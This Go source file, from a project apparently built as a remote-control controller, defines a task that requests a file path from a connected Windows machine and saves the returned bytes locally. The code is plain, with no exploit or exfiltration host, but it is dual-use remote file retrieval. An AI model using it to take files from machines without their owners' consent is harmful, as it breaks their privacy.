package windows

import (
	"io"
	"os"
	"path"
	"strconv"
	"time"

	log "github.com/sirupsen/logrus"

	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
)

type GetFileContentTask struct {
	task.Base
	Path     string
	savePath string
}

func (t *GetFileContentTask) GetCmdType() definition.Cmd {
	return definition.GetFileContent
}

func (t *GetFileContentTask) GetSerializedParam() string {
	return t.Path
}

func (t *GetFileContentTask) OnTransConnEstablished(r io.ReadWriter) {
	t.Status = definition.TaskFinished

	t.savePath = path.Join("./static", strconv.Itoa(int(time.Now().Unix()))+t.ID)
	f, err := os.Create(t.savePath)
	if err != nil {
		t.Status = definition.TaskErrorInExecution
		return
	}
	defer f.Close()
	newByte := make([]byte, 128)
	for {
		n, err := r.Read(newByte)
		if err != nil {
			if err != definition.TimeOutError {
				log.Warn(err)
				return
			}
			continue
		}
		_, _ = f.Write(newByte[:n])
	}
}

func (t *GetFileContentTask) GetResult() string {
	return t.savePath
}
